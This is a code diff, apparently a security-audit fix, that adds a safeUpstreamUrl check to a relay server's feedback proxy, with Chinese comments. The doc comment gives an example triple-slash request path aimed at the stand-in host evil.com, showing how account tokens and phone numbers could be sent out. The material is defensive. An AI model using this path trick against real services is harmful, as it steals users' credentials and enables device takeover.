@@ -2884,13 +2884,45 @@ async function feedbackAuthToken(relayDir) {
   else fbTokenCache = { token: "", exp: 0 };
   return t;
 }
+/**
+ * 把「请求路径后缀」安全地拼到上游基址上（2026-09-27 安全审计 S4-C0）。
+ *
+ * ⚠️ 为什么不能只 `new URL(suffix, base)`：`suffix` 来自**请求路径**，而
+ *    `new URL("//evil.com/x", base)` 是**协议相对 URL** —— origin 直接跳到 evil.com。
+ *    实测逃逸形态是**三斜杠**：请求 `/dsh-remote/feedback///evil.com/collect`，
+ *    路由前缀匹配通过（pathname 原样保留三斜杠），旧代码只 `replace(/^\//,"")` 剥掉一个，
+ *    于是剩下 `//evil.com/collect` → 解析成 `https://evil.com/collect`，
+ *    而 proxyFeedback 会**自动带上本机账号 JWT + 真实手机号 + device_id** ——
+ *    攻击者凭这个 JWT 就能签发设备访问密钥、配对到自己手机上 = 用户电脑被完整接管。
+ *    两斜杠/`%2f`/`..` 都被限制在中继域内，**唯独三斜杠会逃逸**。
+ *
+ * 两道断言（不是二选一，缺一不可）：
+ *   ① origin 必须与基址一致 → 挡住协议相对/绝对 URL 逃逸；
+ *   ② pathname 必须以基址路径为前缀 → 挡住 `..` 逃出基址路径（如 /relay-api/ → /api/）。
+ * 任何一条不过就抛，调用方按 4xx/5xx 处理，**绝不在这种情况下把凭据发出去**。
+ */
+export function safeUpstreamUrl(base, suffix) {
+  const b = new URL(base);
+  const u = new URL(String(suffix == null ? "" : suffix).replace(/^\/+/, ""), b);
+  if (u.origin !== b.origin) throw new Error(`上游地址逃逸(origin): ${u.origin} ≠ ${b.origin}`);
+  const prefix = b.pathname.endsWith("/") ? b.pathname : `${b.pathname}/`;
+  if (!u.pathname.startsWith(prefix)) throw new Error(`上游路径逃逸(path): ${u.pathname} 不在 ${prefix} 之下`);
+  return u;
+}
+
 async function proxyFeedback(relayDir, req, res, pathname) {
   const cfg = loadConfig(relayDir);
   const api = feedbackApiOf(cfg);
   const suffix = pathname.replace(/^\/dsh-remote\/feedback/, "") || "/";
-  // 相对路径解析：保留基址的路径前缀（如 /relay-api），避免 new URL 绝对路径吞掉 base path
+  // 相对路径解析：保留基址的路径前缀（如 /relay-api），避免 new URL 绝对路径吞掉 base path。
+  // 必须走 safeUpstreamUrl：拼错的/恶意的后缀会带着账号 JWT 跑到别的域去（S4-C0）。
   const base = api.endsWith("/") ? api : `${api}/`;
-  const url = new URL(suffix.replace(/^\//, ""), base);
+  let url;
+  try {
+    url = safeUpstreamUrl(base, suffix);
+  } catch (e) {
+    return sendJson(res, 400, { ok: false, error: `非法的反馈接口路径: ${e.message}` });
+  }
   const headers = {
     "x-dsh-device": cfg.device_id || "",
     "x-dsh-client": `dsh-remote-web/${PLUGIN_VERSION}`,
